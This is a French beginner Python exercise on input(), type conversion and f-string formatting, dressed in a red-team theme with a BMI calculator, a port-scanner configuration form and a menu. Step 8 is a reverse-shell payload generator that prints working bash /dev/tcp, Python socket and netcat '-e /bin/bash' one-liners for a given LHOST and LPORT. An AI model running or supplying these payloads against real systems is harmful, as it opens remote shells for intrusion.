"""
═══════════════════════════════════════════════════════════════
EXERCICE 03 : Input et Output
═══════════════════════════════════════════════════════════════

OBJECTIF :
- Apprendre à utiliser input() pour recevoir des données
- Convertir les inputs en types appropriés
- Créer des programmes interactifs
- Maîtriser le formatage avec f-strings

EXÉCUTION : python main.py

═══════════════════════════════════════════════════════════════
"""

def main():
    # ═══════════════════════════════════════════════════════════
    # ÉTAPE 1 : Premier input basique
    # ═══════════════════════════════════════════════════════════

    print("=== Étape 1 : Premier input ===\n")

    # input() affiche un message et attend que l'utilisateur tape quelque chose
    # L'utilisateur appuie sur Entrée pour valider
    # La valeur tapée est stockée dans la variable

    nom = input("Entrez votre nom : ")

    # Affichons ce que l'utilisateur a tapé
    print(f"Bonjour {nom} !")
    print(f"Type de la variable nom : {type(nom)}")  # Toujours str !

    # ═══════════════════════════════════════════════════════════
    # ÉTAPE 2 : Input avec conversion de types
    # ═══════════════════════════════════════════════════════════

    print("\n=== Étape 2 : Conversion de types ===\n")

    # IMPORTANT : input() retourne TOUJOURS une chaîne (str)
    # Même si l'utilisateur tape un nombre !

    age_str = input("Entrez votre âge : ")
    print(f"Type avant conversion : {type(age_str)}")

    # Pour faire des calculs, on doit convertir en int ou float
    age = int(age_str)
    print(f"Type après conversion : {type(age)}")

    # Maintenant on peut faire des calculs
    annee_naissance = 2024 - age
    print(f"Vous êtes né(e) en {annee_naissance}")

    # ═══════════════════════════════════════════════════════════
    # ÉTAPE 3 : Conversion directe dans input()
    # ═══════════════════════════════════════════════════════════

    print("\n=== Étape 3 : Conversion directe ===\n")

    # On peut convertir directement sans variable intermédiaire
    taille = float(input("Entrez votre taille en mètres (ex: 1.75) : "))
    poids = float(input("Entrez votre poids en kg : "))

    # Calcul de l'IMC (Indice de Masse Corporelle)
    imc = poids / (taille ** 2)
    print(f"\nVotre IMC : {imc:.2f}")

    # Interprétation
    if imc < 18.5:
        interpretation = "Insuffisance pondérale"
    elif imc < 25:
        interpretation = "Poids normal"
    elif imc < 30:
        interpretation = "Surpoids"
    else:
        interpretation = "Obésité"

    print(f"Interprétation : {interpretation}")

    # ═══════════════════════════════════════════════════════════
    # ÉTAPE 4 : Inputs multiples
    # ═══════════════════════════════════════════════════════════

    print("\n=== Étape 4 : Configuration de scan ===\n")

    # Simulons la configuration d'un scanner de ports
    print("Configuration du scanner de ports\n")

    ip_cible = input("Adresse IP cible : ")
    port_debut = int(input("Port de début : "))
    port_fin = int(input("Port de fin : "))
    timeout = float(input("Timeout (secondes) : "))

    print("\n" + "═" * 50)
    print("CONFIGURATION ENREGISTRÉE")
    print("═" * 50)
    print(f"Cible       : {ip_cible}")
    print(f"Ports       : {port_debut} - {port_fin}")
    print(f"Timeout     : {timeout}s")
    print(f"Nb de ports : {port_fin - port_debut + 1}")
    print("═" * 50)

    # ═══════════════════════════════════════════════════════════
    # ÉTAPE 5 : Formatage avancé avec f-strings
    # ═══════════════════════════════════════════════════════════

    print("\n=== Étape 5 : Formatage avancé ===\n")

    # Demandons des informations pour un rapport
    nom_outil = input("Nom de l'outil : ")
    version = input("Version : ")
    pourcentage_reussite = float(input("Taux de réussite (0-100) : "))

    # Formatage avec différentes options
    print("\nExemples de formatage :\n")

    # Nombres décimaux
    print(f"Taux : {pourcentage_reussite:.2f}%")  # 2 décimales
    print(f"Taux : {pourcentage_reussite:.1f}%")  # 1 décimale
    print(f"Taux : {pourcentage_reussite:.0f}%")  # 0 décimale (arrondi)

    # Alignement
    print(f"\nNom    : {nom_outil:<20}")  # Aligné à gauche
    print(f"Version: {version:>20}")      # Aligné à droite
    print(f"Taux   : {pourcentage_reussite:^20.2f}")  # Centré

    # Padding avec zéros
    numero_version = 7
    print(f"\nVersion formatée : v{numero_version:03d}")  # v007

    # ═══════════════════════════════════════════════════════════
    # ÉTAPE 6 : Input avec valeur par défaut
    # ═══════════════════════════════════════════════════════════

    print("\n=== Étape 6 : Valeurs par défaut ===\n")

    # Technique pour avoir une valeur par défaut
    ip = input("IP cible [192.168.1.1] : ") or "192.168.1.1"
    port = input("Port [80] : ")
    port = int(port) if port else 80

    print(f"\nConnexion à {ip}:{port}")

    # ═══════════════════════════════════════════════════════════
    # ÉTAPE 7 : Input oui/non
    # ═══════════════════════════════════════════════════════════

    print("\n=== Étape 7 : Validation oui/non ===\n")

    # Demander une confirmation
    reponse = input("Lancer le scan ? (o/n) : ")

    if reponse.lower() == 'o':
        print("[*] Lancement du scan...")
        print("[+] Scan terminé avec succès")
    else:
        print("[-] Scan annulé")

    # ═══════════════════════════════════════════════════════════
    # ÉTAPE 8 : Exemple pratique - Générateur de payload
    # ═══════════════════════════════════════════════════════════

    print("\n=== Étape 8 : Générateur de payload ===\n")

    print("╔═══════════════════════════════════════╗")
    print("║    GÉNÉRATEUR DE REVERSE SHELL        ║")
    print("╚═══════════════════════════════════════╝\n")

    # Collecte des informations
    lhost = input("LHOST (votre IP) : ")
    lport = int(input("LPORT (votre port) : "))
    shell_type = input("Type de shell (bash/python/nc) : ")

    # Génération du payload selon le type
    print("\n" + "═" * 60)
    print("PAYLOAD GÉNÉRÉ")
    print("═" * 60)

    if shell_type.lower() == "bash":
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    elif shell_type.lower() == "python":
        payload = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    elif shell_type.lower() == "nc":
        payload = f"nc {lhost} {lport} -e /bin/bash"
    else:
        payload = "Type de shell non reconnu"

    print(f"\n{payload}\n")
    print("═" * 60)
    print("\n⚠️  Utilisez ce payload uniquement dans un environnement autorisé !")

    # ═══════════════════════════════════════════════════════════
    # ÉTAPE 9 : Menu interactif complet
    # ═══════════════════════════════════════════════════════════

    print("\n=== Étape 9 : Menu interactif ===\n")

    print("╔════════════════════════════════════════╗")
    print("║         RED TEAM TOOLKIT               ║")
    print("╠════════════════════════════════════════╣")
    print("║ [1] Scanner de ports                   ║")
    print("║ [2] Cracker de mots de passe           ║")
    print("║ [3] Générateur de payload              ║")
    print("║ [4] Quitter                            ║")
    print("╚════════════════════════════════════════╝\n")

    choix = input("Votre choix : ")

    if choix == "1":
        print("\n[*] Lancement du scanner de ports...")
    elif choix == "2":
        print("\n[*] Lancement du cracker de mots de passe...")
    elif choix == "3":
        print("\n[*] Lancement du générateur de payload...")
    elif choix == "4":
        print("\n[*] Au revoir !")
    else:
        print("\n[-] Choix invalide")


# ═══════════════════════════════════════════════════════════════
# Point d'entrée
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("\n" + "═" * 60)
    print("EXERCICE 03 : INPUT ET OUTPUT")
    print("═" * 60 + "\n")

    main()

    print("\n" + "═" * 60)
    print("FIN DE L'EXERCICE")
    print("═" * 60 + "\n")
